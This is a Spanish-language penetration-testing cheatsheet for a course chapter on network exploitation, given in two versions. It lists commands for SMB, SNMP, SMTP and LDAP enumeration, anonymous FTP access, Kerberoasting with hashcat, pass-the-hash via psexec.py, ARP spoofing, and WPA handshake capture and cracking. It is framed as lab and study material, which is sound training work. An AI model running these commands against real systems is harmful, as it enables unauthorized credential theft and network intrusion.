
# CHEATSHEET - CAPÍTULO 5: EXPLOTACIÓN DE VULNERABILIDADES

### 1. SMB (Server Message Block)
**Enumeración básica:**
```bash
# Escanear puertos SMB (445, 139)
nmap -p 445,139 -sV <IP>

# Enumerar recursos compartidos
smbclient -L //<IP> -N

# Enumerar usuarios y recursos (herramienta clave)
enum4linux -a <IP>

2. SNMP (Simple Network Management Protocol)
bash

# Escanear SNMP (puerto 161)
nmap -sU -p 161 <IP>

# Enumerar información con snmpwalk
snmpwalk -v 2c -c public <IP>

3. SMTP (Simple Mail Transfer Protocol)
bash

# Escanear SMTP (puerto 25)
nmap -p 25 -sV <IP>

# Enumerar usuarios (VRFY, EXPN)
smtp-user-enum -M VRFY -U usuarios.txt -t <IP>

4. FTP (File Transfer Protocol)
bash

# Escanear FTP (puerto 21)
nmap -p 21 -sV <IP>

# Conectar anónimo
ftp <IP>
# Usuario: anonymous, Contraseña: (vacío)

5. Kerberoasting (Ataque a Kerberos)
bash

# Extraer tickets Kerberos (necesitas credenciales)
GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <IP> -request

# Crackear tickets con hashcat
hashcat -m 13100 tickets.txt wordlist.txt

6. LDAP (Lightweight Directory Access Protocol)
bash

# Enumerar LDAP (puerto 389)
nmap -p 389 -sV <IP>

# Consultar información
ldapsearch -x -H ldap://<IP> -b "dc=<DOMAIN>,dc=com"

🟡 PRIORIDAD MEDIA (Solo para laboratorios)
7. Pass-the-Hash
bash

# Usar hash para autenticarse (necesitas Impacket)
psexec.py <DOMAIN>/<USER>@<IP> -hashes <LMHASH>:<NTHASH>

8. Ataques en ruta (MITM)
bash

# ARP Spoofing con Ettercap (solo en laboratorio)
ettercap -T -M arp:remote /<TARGET-IP>/ /<GATEWAY-IP>/

HERRAMIENTAS CLAVE
Herramienta	Uso
enum4linux	Enumeración SMB
smbclient	Cliente SMB
snmpwalk	Enumeración SNMP
smtp-user-enum	Enumeración de usuarios SMTP
GetUserSPNs.py	Kerberoasting
ldapsearch	Enumeración LDAP
nmap	Escaneo de puertos
ettercap	MITM (solo laboratorios)
Impacket	Suite de herramientas (psexec, secretsdump)


ASÍ QUEDARÍA EL CHEATSHEET DEL CAPÍTULO 5 (COMPLETO)
markdown

# CHEATSHEET - CAPÍTULO 5: EXPLOTACIÓN DE REDES CABLEADAS E INALÁMBRICAS

---

## 📌 NIVEL 1 (USO DIARIO – LO QUE USARÁS EL 90% DEL TIEMPO)

### 1. SMB (Server Message Block)
```bash
# Escaneo de puertos
nmap -p 445,139 -sV <IP>

# Enumeración completa
enum4linux -a <IP>

# Listar recursos compartidos anónimos
smbclient -L //<IP> -N

2. SNMP (Simple Network Management Protocol)
bash

# Escaneo UDP
nmap -sU -p 161 <IP>

# Enumerar información con comunidad pública
snmpwalk -v 2c -c public <IP>

3. SMTP (Simple Mail Transfer Protocol)
bash

# Escaneo de puerto
nmap -p 25 -sV <IP>

# Enumerar usuarios con VRFY
smtp-user-enum -M VRFY -U usuarios.txt -t <IP>

4. FTP (File Transfer Protocol)
bash

# Escaneo
nmap -p 21 -sV <IP>

# Conexión anónima
ftp <IP>
# Usuario: anonymous, Contraseña: (vacío)

5. LDAP (Lightweight Directory Access Protocol)
bash

# Escaneo
nmap -p 389,636 -sV <IP>

# Enumeración básica
ldapsearch -x -H ldap://<IP> -b "dc=<DOMAIN>,dc=com"

🟡 NIVEL 2 (CONSULTA OCASIONAL – PARA ENTORNOS ESPECÍFICOS)
6. Kerberoasting (Active Directory)
bash

# Extraer tickets (requiere credenciales)
GetUserSPNs.py <DOMAIN>/<USER>:<PASS> -dc-ip <IP> -request

# Crackear con hashcat
hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt

7. Pass-the-Hash (Movimiento lateral)
bash

# Usar hash para autenticarse (Impacket)
psexec.py <DOMAIN>/<USER>@<IP> -hashes <LMHASH>:<NTHASH>

8. MITM (Man-in-the-Middle) – Solo en laboratorios
bash

# ARP Spoofing con Ettercap
ettercap -T -M arp:remote /<TARGET-IP>/ /<GATEWAY-IP>/

🔴 NIVEL 3 (SOLO TEORÍA – NO USAR EN PRODUCCIÓN)
9. Ataques WiFi (solo para conocimiento general)
bash

# Activar modo monitor
sudo airmon-ng start wlan0

# Escanear redes
sudo airodump-ng wlan0mon

# Capturar handshake WPA/WPA2
sudo airodump-ng -c <CH> --bssid <BSSID> -w captura wlan0mon

# Crackear handshake
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap

10. DoS / DDoS (solo teoría)
bash

# NUNCA USAR EN PRODUCCIÓN
# Herramientas: hping3, slowloris

11. NAC Bypass / VLAN Hopping (solo teoría)
bash

# Saltos de VLAN: Switch spoofing, Double tagging
# NAC Bypass: MAC spoofing, DHCP starvation

✅ CÓMO USAR ESTE CHEATSHEET
Situación	Qué nivel usar
Escaneo diario como Analista	Nivel 1 (SMB, SNMP, SMTP, FTP, LDAP)
Entorno con Active Directory	Nivel 2 (Kerberoasting, Pass-the-Hash)
Si te preguntan por WiFi en una entrevista	Nivel 3 (teoría)
Laboratorio de TryHackMe	Nivel 1 y 2
Bug Bounty	Nivel 1 (solo reconocimiento pasivo)
